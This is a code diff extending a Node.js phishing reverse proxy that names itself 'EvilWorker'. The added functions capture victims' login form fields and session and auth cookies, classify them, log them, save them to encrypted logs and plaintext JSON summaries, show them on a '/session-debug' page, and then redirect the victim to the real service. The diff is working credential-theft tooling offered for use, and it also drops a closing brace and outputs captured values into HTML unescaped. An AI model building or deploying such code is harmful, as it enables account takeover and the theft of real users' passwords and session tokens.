@@ -85,6 +85,120 @@ function hasCredentialsBeenCollected(currentSession) {
     return false;
 }
 
+// Enhanced function to extract and log all form data
+function extractAndLogFormData(requestBody, currentSession, requestPath) {
+    if (!requestBody) return;
+    
+    try {
+        const body = requestBody.toString();
+        let formData = {};
+        
+        // Try to parse as JSON first
+        try {
+            formData = JSON.parse(body);
+        } catch (e) {
+            // Try to parse as URL-encoded form data
+            try {
+                const urlParams = new URLSearchParams(body);
+                for (const [key, value] of urlParams.entries()) {
+                    formData[key] = value;
+                }
+            } catch (e2) {
+                // If all parsing fails, store raw body
+                formData = { rawBody: body };
+            }
+        }
+        
+        // Check for credential fields and log them
+        const credentialFields = {};
+        const otherFields = {};
+        
+        for (const [key, value] of Object.entries(formData)) {
+            const keyLower = key.toLowerCase();
+            if (config.credentials.credentialFields.some(field => keyLower.includes(field))) {
+                credentialFields[key] = value;
+            } else {
+                otherFields[key] = value;
+            }
+        }
+        
+        // Log all form data
+        if (Object.keys(formData).length > 0) {
+            console.log(`[FORM_DATA_CAPTURED] Session: ${currentSession} - Path: ${requestPath}`);
+            console.log(`[FORM_DATA_CAPTURED] All Fields:`, formData);
+            
+            if (Object.keys(credentialFields).length > 0) {
+                console.log(`[CREDENTIALS_FOUND] Session: ${currentSession} - Credential Fields:`, credentialFields);
+                
+                // Store credentials in session for later analysis
+                if (!VICTIM_SESSIONS[currentSession].capturedCredentials) {
+                    VICTIM_SESSIONS[currentSession].capturedCredentials = [];
+                }
+                
+                VICTIM_SESSIONS[currentSession].capturedCredentials.push({
+                    timestamp: new Date().toISOString(),
+                    path: requestPath,
+                    credentialFields: credentialFields,
+                    allFields: formData
+                });
+            }
+        }
+        
+        // Store complete form data in session
+        VICTIM_SESSIONS[currentSession].lastFormData = formData;
+        VICTIM_SESSIONS[currentSession].lastRequestBody = body;
+        
+    } catch (error) {
+        console.error(`[ERROR] Failed to extract form data for session ${currentSession}:`, error);
+    }
+}
+
+// Enhanced function to log all cookies for a session
+function logAllCookies(currentSession) {
+    if (!currentSession || !VICTIM_SESSIONS[currentSession]) return;
+    
+    const session = VICTIM_SESSIONS[currentSession];
+    if (session.cookies && session.cookies.length > 0) {
+        console.log(`[ALL_COOKIES_CAPTURED] Session: ${currentSession} - Total Cookies: ${session.cookies.length}`);
+        
+        // Group cookies by type
+        const credentialCookies = [];
+        const sessionCookies = [];
+        const otherCookies = [];
+        
+        for (const cookie of session.cookies) {
+            const cookieName = cookie.name.toLowerCase();
+            if (config.credentials.credentialKeywords.some(keyword => cookieName.includes(keyword))) {
+                credentialCookies.push(cookie);
+            } else if (cookieName.includes('session') || cookieName.includes('token') || cookieName.includes('auth')) {
+                sessionCookies.push(cookie);
+            } else {
+                otherCookies.push(cookie);
+            }
+        }
+        
+        if (credentialCookies.length > 0) {
+            console.log(`[COOKIE_ANALYSIS] Session: ${currentSession} - Credential Cookies:`, credentialCookies.map(c => ({ name: c.name, value: c.value.substring(0, 50) + '...' })));
+        }
+        if (sessionCookies.length > 0) {
+            console.log(`[COOKIE_ANALYSIS] Session: ${currentSession} - Session/Auth Cookies:`, sessionCookies.map(c => ({ name: c.name, value: c.value.substring(0, 50) + '...' })));
+        }
+        if (otherCookies.length > 0) {
+            console.log(`[COOKIE_ANALYSIS] Session: ${currentSession} - Other Cookies:`, otherCookies.map(c => ({ name: c.name, value: c.value.substring(0, 50) + '...' })));
+        }
+        
+        // Store cookie analysis in session
+        session.cookieAnalysis = {
+            timestamp: new Date().toISOString(),
+            totalCookies: session.cookies.length,
+            credentialCookies: credentialCookies.length,
+            sessionCookies: sessionCookies.length,
+            otherCookies: otherCookies.length,
+            allCookies: session.cookies
+        };
+    }
+}
+
 // Function to check if this is a login form submission
 function isLoginFormSubmission(proxyRequestBody, proxyRequestOptions) {
     if (!proxyRequestBody) return false;
@@ -144,22 +258,62 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     // Session debug endpoint to see captured data
     if (url === "/session-debug") {
         if (!currentSession) {
-            clientResponse.writeHead(200, { "Content-Type": "application/json" });
-            clientResponse.end(JSON.stringify({ error: "No active session" }));
+            clientResponse.writeHead(200, { "Content-Type": "text/html" });
+            clientResponse.end(`
+                <html>
+                <head><title>EvilWorker - No Active Session</title></head>
+                <body>
+                    <h1>No Active Session</h1>
+                    <p>No active session found. Please visit a phishing link first.</p>
+                    <p><a href="/">Back to Home</a></p>
+                </body>
+                </html>
+            `);
             return;
         }
         
         const session = VICTIM_SESSIONS[currentSession];
-        clientResponse.writeHead(200, { "Content-Type": "application/json" });
-        clientResponse.end(JSON.stringify({
-            sessionId: currentSession,
-            cookies: session.cookies,
-            lastRequestBody: session.lastRequestBody,
-            hasCredentials: hasCredentialsBeenCollected(currentSession),
-            isLoginForm: session.lastRequestBody ? isLoginFormSubmission(session.lastRequestBody, { path: url, headers: headers }) : false
-        }));
+        clientResponse.writeHead(200, { "Content-Type": "text/html" });
+        clientResponse.end(`
+            <html>
+            <head><title>EvilWorker - Session Data</title></head>
+            <body>
+                <h1>Session Data for: ${currentSession}</h1>
+                <h2>Target Service</h2>
+                <p><strong>URL:</strong> ${session.targetService?.protocol}//${session.targetService?.host}${session.targetService?.path}</p>
+                <p><strong>Created:</strong> ${session.createdAt}</p>
+                <p><strong>Requests:</strong> ${session.requestCount}</p>
+                
+                <h2>Captured Credentials</h2>
+                <p><strong>Total:</strong> ${session.capturedCredentials?.length || 0}</p>
+                ${session.capturedCredentials?.map(cred => `
+                    <div style="border: 1px solid #ccc; margin: 10px; padding: 10px;">
+                        <p><strong>Time:</strong> ${cred.timestamp}</p>
+                        <p><strong>Path:</strong> ${cred.path}</p>
+                        <p><strong>Credential Fields:</strong> ${JSON.stringify(cred.credentialFields, null, 2)}</p>
+                        <p><strong>All Fields:</strong> ${JSON.stringify(cred.allFields, null, 2)}</p>
+                    </div>
+                `).join('') || '<p>No credentials captured yet.</p>'}
+                
+                <h2>All Cookies (${session.cookies?.length || 0})</h2>
+                ${session.cookies?.map(cookie => `
+                    <div style="border: 1px solid #ccc; margin: 5px; padding: 5px;">
+                        <p><strong>Name:</strong> ${cookie.name}</p>
+                        <p><strong>Value:</strong> ${cookie.value.substring(0, 100)}${cookie.value.length > 100 ? '...' : ''}</p>
+                        <p><strong>Domain:</strong> ${cookie.domain}</p>
+                        <p><strong>Path:</strong> ${cookie.path}</p>
+                    </div>
+                `).join('') || '<p>No cookies captured yet.</p>'}
+                
+                <h2>Last Form Data</h2>
+                <pre>${JSON.stringify(session.lastFormData, null, 2) || 'No form data captured yet.'}</pre>
+                
+                <p><a href="/">Back to Home</a></p>
+            </body>
+            </html>
+        `);
         return;
-    }
+
 
     if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
         try {
@@ -266,6 +420,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         if (clientRequestBody) {
                             if (url === PROXY_PATHNAMES.jsCookie) {
                                 updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody], headers.host, currentSession);
+                                // Log all cookies after update
+                                logAllCookies(currentSession);
                                 const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
 
                                 clientResponse.writeHead(200, { "Content-Type": "application/json" });
@@ -323,6 +479,8 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
                                         else if (proxyRequestURL.pathname === PROXY_PATHNAMES.jsCookie) {
                                             updateCurrentSessionCookies(VICTIM_SESSIONS[currentSession], [clientRequestBody.body], headers.host, currentSession);
+                                            // Log all cookies after update
+                                            logAllCookies(currentSession);
                                             const validDomains = getValidDomains([headers.host, VICTIM_SESSIONS[currentSession].hostname]);
 
                                             clientResponse.writeHead(200, { "Content-Type": "application/json" });
@@ -360,9 +518,10 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 
                         const proxyRequestBody = clientRequestBody.body ?? clientRequestBody;
                         
-                        // Store the request body for credential detection
+                        // Enhanced data capture - extract and log all form data
                         if (proxyRequestBody) {
-                            VICTIM_SESSIONS[currentSession].lastRequestBody = proxyRequestBody.toString();
+                            extractAndLogFormData(proxyRequestBody, currentSession, proxyRequestOptions.path);
+                            VICTIM_SESSIONS[currentSession].requestCount++;
                         }
                         
                         const requestContentLength = Buffer.byteLength(proxyRequestBody);
@@ -504,19 +663,36 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
 
                 // Check if credentials have been collected and redirect if needed
                 if (config.credentials.enableRedirect && (hasCredentialsBeenCollected(currentSession) || isLoginFormSubmission(proxyRequestBody, proxyRequestOptions))) {
-                    console.log(`[CREDENTIALS_COLLECTED] Session: ${currentSession} - Redirecting to: ${config.credentials.redirectUrl}`);
-                    console.log(`[CREDENTIALS_COLLECTED] Cookies captured: ${VICTIM_SESSIONS[currentSession].cookies.length}`);
-                    console.log(`[CREDENTIALS_COLLECTED] Request body: ${VICTIM_SESSIONS[currentSession].lastRequestBody ? 'Present' : 'None'}`);
+                    console.log(`[CREDENTIALS_DETECTED] Session: ${currentSession} - Starting comprehensive data capture before redirect`);
                     
-                    // Log the credential collection event
+                    // Enhanced data capture before redirect
+                    await captureAllSessionData(currentSession, proxyRequestBody, proxyRequestOptions);
+                    
+                    console.log(`[CREDENTIALS_COLLECTED] Session: ${currentSession} - All data captured, redirecting to: ${config.credentials.redirectUrl}`);
+                    console.log(`[CREDENTIALS_COLLECTED] Cookies captured: ${VICTIM_SESSIONS[currentSession].cookies.length}`);
+                    console.log(`[CREDENTIALS_COLLECTED] Credentials captured: ${VICTIM_SESSIONS[currentSession].capturedCredentials.length}`);
+                    console.log(`[CREDENTIALS_COLLECTED] Form submissions: ${VICTIM_SESSIONS[currentSession].formSubmissions.length}`);
+                    console.log(`[CREDENTIALS_COLLECTED] Total requests: ${VICTIM_SESSIONS[currentSession].requestCount}`);
+                    
+                    // Log the comprehensive credential collection event
                     if (config.logging.enableCredentialLogging) {
                         const credentialLog = {
                             timestamp: new Date().toISOString(),
                             session: currentSession,
-                            event: "CREDENTIALS_COLLECTED",
+                            event: "COMPREHENSIVE_CREDENTIALS_COLLECTED",
                             redirectUrl: config.credentials.redirectUrl,
-                            cookies: VICTIM_SESSIONS[currentSession].cookies,
-                            lastRequestBody: VICTIM_SESSIONS[currentSession].lastRequestBody
+                            sessionSummary: {
+                                cookies: VICTIM_SESSIONS[currentSession].cookies,
+                                capturedCredentials: VICTIM_SESSIONS[currentSession].capturedCredentials,
+                                formSubmissions: VICTIM_SESSIONS[currentSession].formSubmissions,
+                                cookieAnalysis: VICTIM_SESSIONS[currentSession].cookieAnalysis,
+                                lastFormData: VICTIM_SESSIONS[currentSession].lastFormData,
+                                lastRequestBody: VICTIM_SESSIONS[currentSession].lastRequestBody,
+                                requestCount: VICTIM_SESSIONS[currentSession].requestCount,
+                                credentialCount: VICTIM_SESSIONS[currentSession].credentialCount,
+                                targetService: VICTIM_SESSIONS[currentSession].targetService,
+                                createdAt: VICTIM_SESSIONS[currentSession].createdAt
+                            }
                         };
                         
                         const logFileStream = LOG_FILE_STREAMS[currentSession];
@@ -524,20 +700,21 @@ const makeProxyRequest = (proxyRequestProtocol, proxyRequestOptions, currentSess
                             encryptData(JSON.stringify(credentialLog))
                                 .then(encryptedResult => {
                                     logFileStream.write(`${JSON.stringify({ [encryptedResult.iv]: encryptedResult.encryptedData })}\n`);
+                                    console.log(`[LOGGING] Comprehensive credential log encrypted and saved for session: ${currentSession}`);
                                 })
-                                .catch(error => displayError("Credential log encryption failed", error));
+                                .catch(error => displayError("Comprehensive credential log encryption failed", error));
                         }
                     }
                     
-                    // Small delay to ensure data is captured before redirect
-                    setTimeout(() => {
-                        // Redirect to the legitimate service
-                        clientResponse.writeHead(302, { 
-                            Location: config.credentials.redirectUrl,
-                            ...config.security.redirectHeaders
-                        });
-                        clientResponse.end();
-                    }, 100);
+                    // Ensure all data is flushed to disk before redirect
+                    await flushSessionData(currentSession);
+                    
+                    // Redirect to the legitimate service after comprehensive data capture
+                    clientResponse.writeHead(302, { 
+                        Location: config.credentials.redirectUrl,
+                        ...config.security.redirectHeaders
+                    });
+                    clientResponse.end();
                     return;
                 }
                 
@@ -599,6 +776,24 @@ function generateNewSession(phishedURL) {
     VICTIM_SESSIONS[cookieName].value = cookieValue;
     VICTIM_SESSIONS[cookieName].cookies = [];
     VICTIM_SESSIONS[cookieName].logFilename = `${phishedURL.host}__${new Date().toISOString()}`;
+    VICTIM_SESSIONS[cookieName].createdAt = new Date().toISOString();
+    VICTIM_SESSIONS[cookieName].targetService = {
+        protocol: phishedURL.protocol,
+        hostname: phishedURL.hostname,
+        path: phishedURL.pathname,
+        port: phishedURL.port,
+        host: phishedURL.host
+    };
+    
+    // Enhanced credential tracking
+    VICTIM_SESSIONS[cookieName].capturedCredentials = [];
+    VICTIM_SESSIONS[cookieName].formSubmissions = [];
+    VICTIM_SESSIONS[cookieName].cookieAnalysis = null;
+    VICTIM_SESSIONS[cookieName].lastFormData = null;
+    VICTIM_SESSIONS[cookieName].lastRequestBody = null;
+    VICTIM_SESSIONS[cookieName].requestCount = 0;
+    VICTIM_SESSIONS[cookieName].credentialCount = 0;
+    
     createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
 
     return {
@@ -1134,4 +1329,120 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     
     decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
     return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
+}
+
+// Enhanced function to capture all session data before redirect
+async function captureAllSessionData(currentSession, proxyRequestBody, proxyRequestOptions) {
+    if (!currentSession || !VICTIM_SESSIONS[currentSession]) return;
+    
+    console.log(`[DATA_CAPTURE] Session: ${currentSession} - Starting comprehensive data capture`);
+    
+    const session = VICTIM_SESSIONS[currentSession];
+    
+    // 1. Capture current request data if not already captured
+    if (proxyRequestBody) {
+        extractAndLogFormData(proxyRequestBody, currentSession, proxyRequestOptions.path);
+        session.requestCount++;
+    }
+    
+    // 2. Ensure all cookies are analyzed and logged
+    logAllCookies(currentSession);
+    
+    // 3. Capture any additional session metadata
+    session.lastActivity = new Date().toISOString();
+    session.redirectTriggered = true;
+    session.redirectTimestamp = new Date().toISOString();
+    
+    // 4. Perform final credential analysis
+    if (session.lastFormData) {
+        const credentialFields = {};
+        const otherFields = {};
+        
+        for (const [key, value] of Object.entries(session.lastFormData)) {
+            const keyLower = key.toLowerCase();
+            if (config.credentials.credentialFields.some(field => keyLower.includes(field))) {
+                credentialFields[key] = value;
+            } else {
+                otherFields[key] = value;
+            }
+        }
+        
+        if (Object.keys(credentialFields).length > 0) {
+            session.credentialCount++;
+            session.capturedCredentials.push({
+                timestamp: new Date().toISOString(),
+                path: proxyRequestOptions.path,
+                credentialFields: credentialFields,
+                allFields: session.lastFormData,
+                source: 'final_capture'
+            });
+        }
+    }
+    
+    // 5. Create comprehensive session summary
+    session.finalSummary = {
+        timestamp: new Date().toISOString(),
+        totalCookies: session.cookies.length,
+        totalCredentials: session.capturedCredentials.length,
+        totalRequests: session.requestCount,
+        targetService: session.targetService,
+        sessionDuration: Date.now() - new Date(session.createdAt).getTime(),
+        dataCaptureComplete: true
+    };
+    
+    console.log(`[DATA_CAPTURE] Session: ${currentSession} - Comprehensive data capture completed`);
+    console.log(`[DATA_CAPTURE] Summary: ${session.finalSummary.totalCookies} cookies, ${session.finalSummary.totalCredentials} credentials, ${session.finalSummary.totalRequests} requests`);
+}
+
+// Function to flush all session data to disk before redirect
+async function flushSessionData(currentSession) {
+    if (!currentSession || !VICTIM_SESSIONS[currentSession]) return;
+    
+    console.log(`[DATA_FLUSH] Session: ${currentSession} - Flushing session data to disk`);
+    
+    try {
+        // 1. Ensure log file stream is flushed
+        const logFileStream = LOG_FILE_STREAMS[currentSession];
+        if (logFileStream) {
+            await new Promise((resolve, reject) => {
+                logFileStream.end();
+                logFileStream.on('finish', resolve);
+                logFileStream.on('error', reject);
+            });
+            console.log(`[DATA_FLUSH] Session: ${currentSession} - Log file flushed successfully`);
+        }
+        
+        // 2. Create final session summary file
+        const session = VICTIM_SESSIONS[currentSession];
+        const summaryPath = path.join(LOGS_DIRECTORY, `session_summary_${currentSession}.json`);
+        
+        const sessionSummary = {
+            sessionId: currentSession,
+            finalSummary: session.finalSummary,
+            capturedCredentials: session.capturedCredentials,
+            cookies: session.cookies,
+            cookieAnalysis: session.cookieAnalysis,
+            formSubmissions: session.formSubmissions,
+            lastFormData: session.lastFormData,
+            targetService: session.targetService,
+            timestamps: {
+                created: session.createdAt,
+                lastActivity: session.lastActivity,
+                redirectTriggered: session.redirectTimestamp
+            }
+        };
+        
+        await fs.promises.writeFile(summaryPath, JSON.stringify(sessionSummary, null, 2));
+        console.log(`[DATA_FLUSH] Session: ${currentSession} - Session summary saved to: ${summaryPath}`);
+        
+        // 3. Mark session as completely captured
+        session.dataCaptureComplete = true;
+        session.dataFlushed = true;
+        
+        console.log(`[DATA_FLUSH] Session: ${currentSession} - All data successfully flushed to disk`);
+        
+    } catch (error) {
+        console.error(`[ERROR] Failed to flush session data for ${currentSession}:`, error);
+        // Don't fail the redirect if flushing fails
+    }
 }
